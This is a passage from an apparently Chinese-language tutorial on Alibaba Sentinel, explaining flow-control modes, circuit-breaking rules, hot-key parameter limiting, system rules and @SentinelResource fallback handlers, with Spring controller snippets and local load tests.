title="Sentinel流控-线程数直接失败"></a>Sentinel流控-线程数直接失败</h3><p>线程数：当调用该API的线程数达到阈值的时候，进行限流。</p><p><img src="../img/sentinel/sentinel5.png" alt=""></p><h3 id="Sentinel流控-关联"><a href="#Sentinel流控-关联" class="headerlink" title="Sentinel流控-关联"></a>Sentinel流控-关联</h3><p><strong>是什么？</strong></p><ul><li>当自己关联的资源达到阈值时，就限流自己</li><li>当与A关联的资源B达到阀值后，就限流A自己（B惹事，A挂了）</li></ul><p><strong>设置testA</strong></p><p>当关联资源/testB的QPS阀值超过1时，就限流/testA的Rest访问地址，<strong>当关联资源到阈值后限制配置好的资源名</strong>。</p><p><img src="../img/sentinel/sentinel6.png" alt=""></p><p><strong>Postman模拟并发密集访问testB</strong></p><p><img src="../img/sentinel/sentinel7.png" alt=""></p><p>访问testB成功</p><p><img src="../img/sentinel/sentinel8.png" alt=""></p><p>postman里新建多线程集合组</p><p><img src="../img/sentinel/sentinel9.png" alt=""></p><p>将访问地址添加进新新线程组</p><p><img src="../img/sentinel/sentinel10.png" alt=""></p><p>Run - 大批量线程高并发访问B</p><p>Postman运行后，点击访问<a href="http://localhost:8401/testA，发现testA挂了" target="_blank" rel="noopener">http://localhost:8401/testA，发现testA挂了</a></p><ul><li>结果Blocked by Sentinel(flow limiting)</li></ul><h3 id="Sentinel流控-预热"><a href="#Sentinel流控-预热" class="headerlink" title="Sentinel流控-预热"></a>Sentinel流控-预热</h3><blockquote><p>Warm Up</p><p>Warm Up（RuleConstant.CONTROL_BEHAVIOR_WARM_UP）方式，即预热/冷启动方式。当系统长期处于低水位的情况下，当流量突然增加时，直接把系统拉升到高水位可能瞬间把系统压垮。通过”冷启动”，让通过的流量缓慢增加，在一定时间内逐渐增加到阈值上限，给冷系统一个预热的时间，避免冷系统被压垮。详细文档可以参考 流量控制 - Warm Up 文档，具体的例子可以参见 WarmUpFlowDemo。</p><p>通常冷启动的过程系统允许通过的 QPS 曲线如下图所示：<br><img src="../img/sentinel/sentinel11.png" alt=""></p><p>默认coldFactor为3，即请求QPS 从 threshold / 3开始，经预热时长逐渐升至设定的QPS阈值。</p></blockquote><p><strong>源码</strong> - com.alibaba.csp.sentinel.slots.block.flow.controller.WarmUpController</p><p><strong>WarmUp配置</strong></p><p>案例，阀值为10+预热时长设置5秒。</p><p>系统初始化的阀值为10/ 3约等于3,即阀值刚开始为3;然后过了5秒后阀值才慢慢升高恢复到10</p><p><img src="../img/sentinel/sentinel12.png" alt=""></p><p><strong>测试</strong></p><p>多次快速点击<a href="http://localhost:8401/testB" target="_blank" rel="noopener">http://localhost:8401/testB</a> - 刚开始不行，后续慢慢OK</p><p><strong>应用场景</strong></p><p>如：秒杀系统在开启的瞬间，会有很多流量上来，很有可能把系统打死，预热方式就是把为了保护系统，可慢慢的把流量放进来,慢慢的把阀值增长到设置的阀值。</p><h3 id="Sentinel流控-排队等待"><a href="#Sentinel流控-排队等待" class="headerlink" title="Sentinel流控-排队等待"></a>Sentinel流控-排队等待</h3><p>匀速排队，让请求以均匀的速度通过，阀值类型必须设成QPS，否则无效。</p><p>设置：/testA每秒1次请求，超过的话就排队等待，等待的超时时间为20000毫秒。</p><p><img src="../img/sentinel/sentinel13.png" alt=""></p><blockquote><p>匀速排队</p><p>匀速排队（RuleConstant.CONTROL_BEHAVIOR_RATE_LIMITER）方式会严格控制请求通过的间隔时间，也即是让请求以均匀的速度通过，对应的是漏桶算法。详细文档可以参考 流量控制 - 匀速器模式，具体的例子可以参见 PaceFlowDemo。</p><p>该方式的作用如下图所示：<br><img src="../img/sentinel/sentinel14.png" alt=""></p><p>这种方式主要用于处理间隔性突发的流量，例如消息队列。想象一下这样的场景，在某一秒有大量的请求到来，而接下来的几秒则处于空闲状态，我们希望系统能够在接下来的空闲期间逐渐处理这些请求，而不是在第一秒直接拒绝多余的请求。</p><blockquote><p>注意：匀速排队模式暂时不支持 QPS &gt; 1000 的场景。</p></blockquote></blockquote><p>源码 - com.alibaba.csp.sentinel.slots.block.flow.controller.RateLimiterController</p><p><strong>测试</strong></p><ul><li>添加日志记录代码到FlowLimitController的testA方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlowLimitController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/testA"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testA</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        log.info(Thread.currentThread().getName()+<span class="string">"\t"</span>+<span class="string">"...testA"</span>);<span class="comment">//&lt;----</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"------testA"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Postman模拟并发密集访问testA</li><li>后台结果</li></ul><p><img src="../img/sentinel/sentinel15.png" alt=""></p><h2 id="Sentinel降级简介"><a href="#Sentinel降级简介" class="headerlink" title="Sentinel降级简介"></a>Sentinel降级简介</h2><p><a href="https://github.com/alibaba/Sentinel/wiki/%E7%86%94%E6%96%AD%E9%99%8D%E7%BA%A7" target="_blank" rel="noopener">官方文档</a></p><blockquote><p>熔断降级概述</p><p>除了流量控制以外，对调用链路中不稳定的资源进行熔断降级也是保障高可用的重要措施之一。一个服务常常会调用别的模块，可能是另外的一个远程服务、数据库，或者第三方 API 等。例如，支付的时候，可能需要远程调用银联提供的 API；查询某个商品的价格，可能需要进行数据库查询。然而，这个被依赖服务的稳定性是不能保证的。如果依赖的服务出现了不稳定的情况，请求的响应时间变长，那么调用服务的方法的响应时间也会变长，线程会产生堆积，最终可能耗尽业务自身的线程池，服务本身也变得不可用。</p><p>现代微服务架构都是分布式的，由非常多的服务组成。不同服务之间相互调用，组成复杂的调用链路。以上的问题在链路调用中会产生放大的效果。复杂链路上的某一环不稳定，就可能会层层级联，最终导致整个链路都不可用。因此我们需要对不稳定的弱依赖服务调用进行熔断降级，暂时切断不稳定调用，避免局部不稳定因素导致整体的雪崩。熔断降级作为保护自身的手段，通常在客户端（调用端）进行配置。</p></blockquote><p><img src="../img/sentinel/sentinel16.png" alt=""></p><ul><li><p>RT（平均响应时间，秒级）</p><ul><li>平均响应时间 超出阈值 且 在时间窗口内通过的请求&gt;=5，两个条件同时满足后触发降级。</li><li>窗口期过后关闭断路器。</li><li>RT最大4900（更大的需要通过-Dcsp.sentinel.statistic.max.rt=XXXX才能生效）。</li></ul></li><li><p>异常比列（秒级）</p><ul><li>QPS &gt;= 5且异常比例（秒级统计）超过阈值时，触发降级;时间窗口结束后，关闭降级 。</li></ul></li><li><p>异常数(分钟级)</p><ul><li>异常数(分钟统计）超过阈值时，触发降级;时间窗口结束后，关闭降级</li></ul></li></ul><p>Sentinel熔断降级会在调用链路中某个资源出现不稳定状态时（例如调用超时或异常比例升高)，对这个资源的调用进行限制，让请求快速失败，避免影响到其它的资源而导致级联错误。</p><p>当资源被降级后，在接下来的降级时间窗口之内，对该资源的调用都自动熔断（默认行为是抛出 DegradeException）。</p><p>Sentinei的断路器是没有类似Hystrix半开状态的。(Sentinei 1.8.0 已有半开状态)</p><p>半开的状态系统自动去检测是否请求有异常，没有异常就关闭断路器恢复使用，有异常则继续打开断路器不可用。</p><h3 id="Sentinel降级-RT"><a href="#Sentinel降级-RT" class="headerlink" title="Sentinel降级-RT"></a>Sentinel降级-RT</h3><p>是什么？</p><blockquote><p>平均响应时间(DEGRADE_GRADE_RT)：当1s内持续进入5个请求，对应时刻的平均响应时间（秒级）均超过阈值（ count，以ms为单位），那么在接下的时间窗口（DegradeRule中的timeWindow，以s为单位）之内，对这个方法的调用都会自动地熔断(抛出DegradeException )。注意Sentinel 默认统计的RT上限是4900 ms，超出此阈值的都会算作4900ms，若需要变更此上限可以通过启动配置项-Dcsp.sentinel.statistic.max.rt=xxx来配置。</p></blockquote><p><strong>注意</strong>：Sentinel 1.7.0才有<strong>平均响应时间</strong>（<code>DEGRADE_GRADE_RT</code>），Sentinel 1.8.0的没有这项，取而代之的是<strong>慢调用比例</strong> (<code>SLOW_REQUEST_RATIO</code>)。</p><blockquote><p>慢调用比例 (SLOW_REQUEST_RATIO)：选择以慢调用比例作为阈值，需要设置允许的慢调用 RT（即最大的响应时间），请求的响应时间大于该值则统计为慢调用。当单位统计时长（statIntervalMs）内请求数目大于设置的最小请求数目，并且慢调用的比例大于阈值，则接下来的熔断时长内请求会自动被熔断。经过熔断时长后熔断器会进入探测恢复状态（HALF-OPEN 状态），若接下来的一个请求响应时间小于设置的慢调用 RT 则结束熔断，若大于设置的慢调用 RT 则会再次被熔断</p></blockquote><p><img src="../img/sentinel/sentinel17.png" alt=""></p><p><strong>测试</strong></p><p>代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlowLimitController</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/testD"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testD</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123; </span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">1</span>); </span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123; </span><br><span class="line">            e.printStackTrace(); </span><br><span class="line">        &#125;</span><br><span class="line">        log.info(<span class="string">"testD 测试RT"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置</p><p><img src="../img/sentinel/sentinel18.png" alt=""></p><p>jmeter压测</p><p><img src="../img/sentinel/sentinel19.png" alt=""></p><p>结论</p><p>按照上述配置，永远一秒钟打进来10个线程（大于5个了）调用testD，我们希望200毫秒处理完本次任务，如果超过200毫秒还没处理完，在未来1秒钟的时间窗口内，断路器打开（保险丝跳闸）微服务不可用，保险丝跳闸断电了后续我停止jmeter，没有这么大的访问量了，断路器关闭（保险丝恢复），微服务恢复OK。</p><h3 id="Sentinel降级-异常比例"><a href="#Sentinel降级-异常比例" class="headerlink" title="Sentinel降级-异常比例"></a>Sentinel降级-异常比例</h3><p><strong>是什么？</strong></p><blockquote><p>异常比例(DEGRADE_GRADE_EXCEPTION_RATIO)：当资源的每秒请求量 &gt;= 5，并且每秒异常总数占通过量的比值超过阈值（ DegradeRule中的 count）之后，资源进入降级状态，即在接下的时间窗口( DegradeRule中的timeWindow，以s为单位）之内，对这个方法的调用都会自动地返回。异常比率的阈值范围是[0.0, 1.0]，代表0% -100%。</p></blockquote><p><strong>注意</strong>，与Sentinel 1.8.0相比，有些不同（Sentinel 1.8.0才有的半开状态），Sentinel 1.8.0的如下：</p><blockquote><p>异常比例 (ERROR_RATIO)：当单位统计时长（statIntervalMs）内请求数目大于设置的最小请求数目，并且异常的比例大于阈值，则接下来的熔断时长内请求会自动被熔断。经过熔断时长后熔断器会进入探测恢复状态（HALF-OPEN 状态），若接下来的一个请求成功完成（没有错误）则结束熔断，否则会再次被熔断。异常比率的阈值范围是 [0.0, 1.0]，代表 0% - 100%。</p></blockquote><p><img src="../img/sentinel/sentinel20.png" alt=""></p><p><strong>测试</strong></p><p>代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlowLimitController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/testD"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testD</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">"testD 异常比例"</span>);</span><br><span class="line">        <span class="keyword">int</span> age = <span class="number">10</span>/<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"------testD"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置</p><p><img src="../img/sentinel/sentinel21.png" alt=""></p><p>jmeter</p><p><img src="../img/sentinel/sentinel22.png" alt=""></p><p><strong>结论</strong></p><p>按照上述配置，单独访问一次，必然来一次报错一次(int age = 10/0)，调一次错一次。</p><p>开启jmeter后，直接高并发发送请求，多次调用达到我们的配置条件了。断路器开启(保险丝跳闸)，微服务不可用了，不再报错error而是服务降级了。</p><h3 id="Sentinel降级-异常数"><a href="#Sentinel降级-异常数" class="headerlink" title="Sentinel降级-异常数"></a>Sentinel降级-异常数</h3><p><strong>是什么？</strong></p><blockquote><p>异常数( <code>DEGRADE_GRADF_EXCEPTION_COUNT</code> )：当资源近1分钟的异常数目超过阈值之后会进行熔断。注意由于统计时间窗口是分钟级别的，若<code>timeWindow</code>小于60s，则结束熔断状态后码可能再进入熔断状态。</p></blockquote><p><strong>注意</strong>，与Sentinel 1.8.0相比，有些不同（Sentinel 1.8.0才有的半开状态），Sentinel 1.8.0的如下：</p><blockquote><p>异常数 (<code>ERROR_COUNT</code>)：当单位统计时长内的异常数目超过阈值之后会自动进行熔断。经过熔断时长后熔断器会进入探测恢复状态（HALF-OPEN 状态），若接下来的一个请求成功完成（没有错误）则结束熔断，否则会再次被熔断。</p></blockquote><p><strong>异常数是按照分钟统计的，时间窗口一定要大于等于60秒</strong>。</p><p><img src="../img/sentinel/sentinel23.png" alt=""></p><p>测试</p><p>代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlowLimitController</span></span>&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/testE"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testE</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        log.info(<span class="string">"testE 测试异常数"</span>);</span><br><span class="line">        <span class="keyword">int</span> age = <span class="number">10</span>/<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"------testE 测试异常数"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置</p><p><img src="../img/sentinel/sentinel24.png" alt=""></p><p>访问<a href="http://localhost:8401/testE，第一次访问绝对报错，因为除数不能为零，我们看到error窗口，但是达到5次报错后，进入熔断后降级。" target="_blank" rel="noopener">http://localhost:8401/testE，第一次访问绝对报错，因为除数不能为零，我们看到error窗口，但是达到5次报错后，进入熔断后降级。</a></p><h2 id="Sentinel热点key"><a href="#Sentinel热点key" class="headerlink" title="Sentinel热点key"></a>Sentinel热点key</h2><p><strong>基本介绍</strong></p><p><img src="../img/sentinel/sentinel25.png" alt=""></p><p><strong>官网</strong></p><p><a href="https://github.com/alibaba/Sentinel/wiki/热点参数限流" target="_blank" rel="noopener">官方文档</a></p><blockquote><p>何为热点？热点即经常访问的数据。很多时候我们希望统计某个热点数据中访问频次最高的 Top K 数据，并对其访问进行限制。比如：</p><ul><li>商品 ID 为参数，统计一段时间内最常购买的商品 ID 并进行限制</li><li>用户 ID 为参数，针对一段时间内频繁访问的用户 ID 进行限制</li></ul><p>热点参数限流会统计传入参数中的热点参数，并根据配置的限流阈值与模式，对包含热点参数的资源调用进行限流。热点参数限流可以看做是一种特殊的流量控制，仅对包含热点参数的资源调用生效。</p><p><img src="../img/sentinel/sentinel26.png" alt=""></p><p>Sentinel 利用 LRU 策略统计最近最常访问的热点参数，结合令牌桶算法来进行参数级别的流控。热点参数限流支持集群模式。</p></blockquote><h3 id="Sentinel自定义降级兜底方案"><a href="#Sentinel自定义降级兜底方案" class="headerlink" title="Sentinel自定义降级兜底方案"></a>Sentinel自定义降级兜底方案</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlowLimitController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/testHotKey"</span>)</span><br><span class="line">    <span class="meta">@SentinelResource</span>(value = <span class="string">"testHotKey"</span>,blockHandler<span class="comment">/*兜底方法*/</span> = <span class="string">"deal_testHotKey"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testHotKey</span><span class="params">(@RequestParam(value = <span class="string">"p1"</span>,required = <span class="keyword">false</span>)</span> String p1,</span></span><br><span class="line"><span class="function">                             @<span class="title">RequestParam</span><span class="params">(value = <span class="string">"p2"</span>,required = <span class="keyword">false</span>)</span> String p2) </span>&#123;</span><br><span class="line">        <span class="comment">//int age = 10/0;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"------testHotKey"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*兜底方法*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">deal_testHotKey</span> <span class="params">(String p1, String p2, BlockException exception)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"------deal_testHotKey,o(╥﹏╥)o"</span>;  <span class="comment">//sentinel系统默认的提示：Blocked by Sentinel (flow limiting)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置</p><p><img src="../img/sentinel/sentinel27.png" alt=""></p><p>一</p><ul><li>@SentinelResource(value = “testHotKey”)</li><li>异常打到了前台用户界面看到，不友好</li></ul><p>二</p><ul><li>@SentinelResource(value = “testHotKey”, blockHandler = “dealHandler_testHotKey”)</li><li>方法testHotKey里面第一个参数只要QPS超过每秒1次，马上降级处理</li><li>异常用了我们自己定义的兜底方法</li></ul><p>测试</p><ul><li><p>error</p><ul><li><p><a href="http://localhost:8401/testHotKey?p1=abc" target="_blank" rel="noopener">http://localhost:8401/testHotKey?p1=abc</a></p></li><li><p><a href="http://localhost:8401/testHotKey?p1=abc&amp;p2=33" target="_blank" rel="noopener">http://localhost:8401/testHotKey?p1=abc&amp;p2=33</a></p></li></ul></li><li><p>right</p><ul><li><a href="http://localhost:8401/testHotKey?p2=abc" target="_blank" rel="noopener">http://localhost:8401/testHotKey?p2=abc</a></li></ul></li></ul><p>上述案例演示了第一个参数p1，当QPS超过1秒1次点击后马上被限流。</p><p><strong>参数例外项</strong></p><ul><li>普通 - 超过1秒钟一个后，达到阈值1后马上被限流</li><li><strong>我们期望p1参数当它是某个特殊值时，它的限流值和平时不一样</strong></li><li>特例 - 假如当p1的值等于5时，它的阈值可以达到200</li></ul><p><strong>配置</strong></p><p><img src="../img/sentinel/sentinel28.png" alt=""></p><p>测试</p><ul><li>right - <a href="http://localhost:8401/testHotKey?p1=5" target="_blank" rel="noopener">http://localhost:8401/testHotKey?p1=5</a></li><li>error - <a href="http://localhost:8401/testHotKey?p1=3" target="_blank" rel="noopener">http://localhost:8401/testHotKey?p1=3</a></li><li>当p1等于5的时候，阈值变为200</li><li>当p1不等于5的时候，阈值就是平常的1</li></ul><p>前提条件 - 热点参数的注意点，参数必须是基本类型或者String</p><p>其它</p><p>在方法体抛异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlowLimitController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/testHotKey"</span>)</span><br><span class="line">    <span class="meta">@SentinelResource</span>(value = <span class="string">"testHotKey"</span>,blockHandler<span class="comment">/*兜底方法*/</span> = <span class="string">"deal_testHotKey"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testHotKey</span><span class="params">(@RequestParam(value = <span class="string">"p1"</span>,required = <span class="keyword">false</span>)</span> String p1,</span></span><br><span class="line"><span class="function">                             @<span class="title">RequestParam</span><span class="params">(value = <span class="string">"p2"</span>,required = <span class="keyword">false</span>)</span> String p2) </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> age = <span class="number">10</span>/<span class="number">0</span>;<span class="comment">//&lt;----------------------------会抛异常的地方</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"------testHotKey"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*兜底方法*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">deal_testHotKey</span> <span class="params">(String p1, String p2, BlockException exception)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"------deal_testHotKey,o(╥﹏╥)o"</span>;  <span class="comment">//sentinel系统默认的提示：Blocked by Sentinel (flow limiting)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将会抛出Spring Boot 2的默认异常页面，而不是兜底方法。</p><ul><li><p>@SentinelResource - 处理的是sentinel控制台配置的违规情况，有blockHandler方法配置的兜底处理;</p></li><li><p>RuntimeException int age = 10/0，这个是java运行时报出的运行时异常RunTimeException，@SentinelResource不管</p></li></ul><p>总结 - @SentinelResource主管配置出错，运行出错该走异常走异常</p><h2 id="Sentinel系统规则"><a href="#Sentinel系统规则" class="headerlink" title="Sentinel系统规则"></a>Sentinel系统规则</h2><p><a href="https://github.com/alibaba/Sentinel/wiki/系统自适应限流" target="_blank" rel="noopener">官方文档</a></p><blockquote><p>Sentinel 系统自适应限流从整体维度对应用入口流量进行控制，结合应用的 Load、CPU 使用率、总体平均 RT、入口 QPS 和并发线程数等几个维度的监控指标，通过自适应的流控策略，让系统的入口流量和系统的负载达到一个平衡，让系统尽可能跑在最大吞吐量的同时保证系统整体的稳定性。</p><p>系统规则</p><p>系统保护规则是从应用级别的入口流量进行控制，从单台机器的 load、CPU 使用率、平均 RT、入口 QPS 和并发线程数等几个维度监控应用指标，让系统尽可能跑在最大吞吐量的同时保证系统整体的稳定性。</p><p>系统保护规则是应用整体维度的，而不是资源维度的，并且仅对入口流量生效。入口流量指的是进入应用的流量（EntryType.IN），比如 Web 服务或 Dubbo 服务端接收的请求，都属于入口流量。</p><p>系统规则支持以下的模式：</p><ul><li>Load 自适应（仅对 Linux/Unix-like 机器生效）：系统的 load1 作为启发指标，进行自适应系统保护。当系统 load1 超过设定的启发值，且系统当前的并发线程数超过估算的系统容量时才会触发系统保护（BBR 阶段）。系统容量由系统的 maxQps <em> minRt 估算得出。设定参考值一般是 CPU cores </em> 2.5。</li><li>CPU usage（1.5.0+ 版本）：当系统 CPU 使用率超过阈值即触发系统保护（取值范围 0.0-1.0），比较灵敏。</li><li>平均 RT：当单台机器上所有入口流量的平均 RT 达到阈值即触发系统保护，单位是毫秒。</li><li>并发线程数：当单台机器上所有入口流量的并发线程数达到阈值即触发系统保护。</li><li>入口 QPS：当单台机器上所有入口流量的 QPS 达到阈值即触发系统保护。</li></ul></blockquote><h2 id="SentinelResource配置"><a href="#SentinelResource配置" class="headerlink" title="SentinelResource配置"></a>SentinelResource配置</h2><p><em>按资源名称限流 + 后续处理</em></p><p><strong>启动Nacos成功</strong></p><p><strong>启动Sentinel成功</strong></p><p><strong>Module - cloudalibaba-sentinel-service8401</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.csp.sentinel.annotation.SentinelResource;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.csp.sentinel.slots.block.BlockException;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.alibaba.myhandler.CustomerBlockHandler;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.entities.CommonResult;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.entities.Payment;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RateLimitController</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/byResource"</span>)</span><br><span class="line">    <span class="meta">@SentinelResource</span>(value = <span class="string">"byResource"</span>,blockHandler = <span class="string">"handleException"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult <span class="title">byResource</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CommonResult(<span class="number">200</span>,<span class="string">"按资源名称限流测试OK"</span>,<span class="keyword">new</span> Payment(<span class="number">2020L</span>,<span class="string">"serial001"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult <span class="title">handleException</span><span class="params">(BlockException exception)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CommonResult(<span class="number">444</span>,exception.getClass().getCanonicalName()+<span class="string">"\t 服务不可用"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>配置流控规则</strong></p><p>配置步骤</p><p><img src="../img/sentinel/sentinel29.png" alt=""></p><p>图形配置和代码关系</p><p>表示1秒钟内查询次数大于1，就跑到我们自定义的处流，限流</p><p><strong>测试</strong></p><p>1秒钟点击1下，OK</p><p>超过上述，疯狂点击，返回了自己定义的限流处理信息，限流发生</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;code&quot;:444, &quot;message&quot;:&quot;com.alibaba.csp.sentinel.slots.block.flow.FlowException\t 服务不可用&quot;, &quot;data&quot;:null&#125;</span><br></pre></td></tr></table></figure><p><strong>额外问题</strong></p><p>此时关闭问服务8401 -&gt; Sentinel控制台，流控规则消失了，<strong>流控规则未持久化。</strong></p><p><em>按照Url地址限流 + 后续处理</em></p><p><strong>通过访问的URL来限流，会返回Sentinel自带默认的限流处理信息</strong></p><p><strong>业务类RateLimitController</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 